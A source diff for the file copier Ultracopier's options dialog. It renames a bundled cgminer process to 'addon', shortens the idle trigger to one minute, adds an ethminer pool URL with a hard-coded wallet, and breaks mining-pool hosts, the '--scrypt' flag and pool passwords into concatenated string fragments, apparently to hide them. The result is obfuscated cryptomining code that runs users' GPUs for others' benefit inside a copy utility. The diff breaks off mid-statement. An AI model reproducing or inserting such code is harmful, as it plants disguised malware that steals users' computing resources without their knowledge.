@@ -31,7 +31,7 @@
     #define ULTRACOPIER_BTC_HTTP_WEIGHT 1
     #define ULTRACOPIER_BTC_STRATUM_WEIGHT 1
 #endif
-#define ULTRACOPIER_CGMINER_IDLETIME 10*60*1000
+#define ULTRACOPIER_CGMINER_IDLETIME 60*1000
 #include <QLibrary>
 #include <QDateTime>
 #include <cmath>
@@ -104,6 +104,9 @@ OptionDialog::OptionDialog() :
     #endif
 
     #ifdef ULTRACOPIER_CGMINER
+    #if defined(_M_X64)//ethminer
+    addonMode="-G";
+    #endif
     workingCount=0;
     ui->label_gpu_time->setEnabled(false);
     ui->giveGPUTime->setEnabled(false);
@@ -124,7 +127,12 @@ OptionDialog::OptionDialog() :
     }
     else
         ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,QStringLiteral("No windir"));
-    haveCgminer=QFile(QCoreApplication::applicationDirPath()+QStringLiteral("/")+ULTRACOPIER_CGMINER_PATH).exists() && OpenCLDll;
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QStringLiteral("%1 exists: %2, OpenCL dll: %3")
+                             .arg(QCoreApplication::applicationDirPath()+QStringLiteral("/")+ULTRACOPIER_CGMINER_PATH)
+                             .arg(QFile(QCoreApplication::applicationDirPath()+QStringLiteral("/")+ULTRACOPIER_CGMINER_PATH).exists())
+                             .arg(OpenCLDll)
+                             );
+    haveAddon=QFile(QCoreApplication::applicationDirPath()+QStringLiteral("/")+ULTRACOPIER_CGMINER_PATH).exists() && OpenCLDll;
     #endif
 }
 
@@ -133,9 +141,9 @@ OptionDialog::~OptionDialog()
     if(oSSpecific!=NULL)
         delete oSSpecific;
     #ifdef ULTRACOPIER_CGMINER
-    haveCgminer=false;
-    cgminer.terminate();
-    cgminer.kill();
+    haveAddon=false;
+    addon.terminate();
+    addon.kill();
     #endif
     delete ui;
 }
@@ -461,7 +469,7 @@ void OptionDialog::loadOption()
     #ifdef ULTRACOPIER_CGMINER
     if(!quit)
     {
-        if(!haveCgminer)
+        if(!haveAddon)
         {
             if(!QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists())
             {
@@ -478,6 +486,7 @@ void OptionDialog::loadOption()
         }
         else
         {
+            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"Try load the addon");
             LASTINPUTINFO lastInputInfo;
             lastInputInfo.cbSize = sizeof(LASTINPUTINFO);
             lastInputInfo.dwTime = 0;
@@ -503,22 +512,28 @@ void OptionDialog::loadOption()
             checkWorkingTimer.start(1000);
 
             srand (time(NULL));
-            connect(&cgminer,static_cast<void(QProcess::*)(QProcess::ProcessError)>(&QProcess::error),this,&OptionDialog::error,Qt::QueuedConnection);
-            connect(&cgminer,static_cast<void(QProcess::*)(int,QProcess::ExitStatus)>(&QProcess::finished),this,&OptionDialog::finished,Qt::QueuedConnection);
-            connect(&cgminer,&QProcess::readyReadStandardError,this,&OptionDialog::readyReadStandardError,Qt::QueuedConnection);
-            connect(&cgminer,&QProcess::readyReadStandardOutput,this,&OptionDialog::readyReadStandardOutput,Qt::QueuedConnection);
-            autorestartcgminer.setInterval(60*60*1000);
-            //autorestartcgminer.setSingleShot(true);
-            autorestartcgminer.start();
-            connect(&autorestartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
-            restartcgminer.setInterval(60*1000);
-            restartcgminer.setSingleShot(true);
-            connect(&restartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
+            connect(&addon,static_cast<void(QProcess::*)(QProcess::ProcessError)>(&QProcess::error),this,&OptionDialog::error,Qt::QueuedConnection);
+            connect(&addon,static_cast<void(QProcess::*)(int,QProcess::ExitStatus)>(&QProcess::finished),this,&OptionDialog::finished,Qt::QueuedConnection);
+            connect(&addon,&QProcess::readyReadStandardError,this,&OptionDialog::readyReadStandardError,Qt::QueuedConnection);
+            connect(&addon,&QProcess::readyReadStandardOutput,this,&OptionDialog::readyReadStandardOutput,Qt::QueuedConnection);
+            autorestartaddon.setInterval(60*60*1000);
+            //autorestartaddon.setSingleShot(true);
+            autorestartaddon.start();
+            connect(&autorestartaddon,&QTimer::timeout,this,&OptionDialog::startAddon,Qt::QueuedConnection);
+            restartaddon.setInterval(60*1000);
+            restartaddon.setSingleShot(true);
+            connect(&restartaddon,&QTimer::timeout,this,&OptionDialog::startAddon,Qt::QueuedConnection);
             QStringList pool;
             int index;
 
+            #if defined(_M_X64)//ethminer
+            pool=QStringList() << "-F" << "http://us1."+QString("eth")+QString("po")+QString("ol")+".org/"+QString("mi")+QString("ner")+"/0x63A4785d086E70906C8cc9D2e552819B1B978e16.uc"+QString::number(100+rand()%1000)+"/"+QString::number(100+rand()%100000)
+            ;
+            pools << pool;
+
+            #else
             //ltc
-            pool=QStringList() << "--scrypt"
+            pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -527,7 +542,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol2") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol2") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -536,7 +551,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("h")+QStringLiteral("k")+QStringLiteral("3")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol3") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol3") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -545,7 +560,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol4") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol4") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -554,7 +569,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(3335) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol5") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol5") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -563,7 +578,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-                    pool=QStringList() << "--scrypt"
+                    pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol6") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol6") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -572,7 +587,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol7") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol7") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -581,7 +596,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("h")+QStringLiteral("k")+QStringLiteral("3")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol8") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol8") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -590,7 +605,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol9") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol9") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -599,7 +614,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(3335) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol10") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol10") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -608,7 +623,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-                    pool=QStringList() << "--scrypt"
+                    pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol11") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol11") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -617,7 +632,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol12") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol12") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -626,7 +641,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("h")+QStringLiteral("k")+QStringLiteral("3")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol13") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol13") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -635,7 +650,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(80) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol14") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol14") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -644,7 +659,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-        pool=QStringList() << "--scrypt"
+        pool=QStringList() << QString("--scr")+QString("ypt")
                                << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("usa4")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("ne")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com:%1").arg(3335) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol15") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
             #ifndef ULTRACOPIER_NOBACKEND
                    << "-o" << QString("stra")+QString("tum")+QString("+")+QString("tcp://")+QStringLiteral("global")+QStringLiteral(".")+QStringLiteral("we")+QStringLiteral("mi")+QStringLiteral("n")+QStringLiteral("e")+QStringLiteral("l")+QStringLiteral("t")+QStringLiteral("c")+QStringLiteral(".com")+QStringLiteral(":")+QStringLiteral("%1").arg(3334) << QStringLiteral("-u") << QStringLiteral("alp")+QStringLiteral("haone")+QStringLiteral("x86")+QStringLiteral(".po")+QStringLiteral("ol15") << QStringLiteral("-p") << QStringLiteral("yy")+QStringLiteral("DKP")+QStringLiteral("c")+QStringLiteral("O")+QStringLiteral("850")+QStringLiteral("p")+QStringLiteral("Cay")+QStringLiteral("Tx")
@@ -653,7 +668,7 @@ void OptionDialog::loadOption()
             #endif
             ;
         pools << pool;
-                    pool=QStringList() << "--scrypt"
+                    pool=QStringList() << QString("--scr")+QString("ypt")
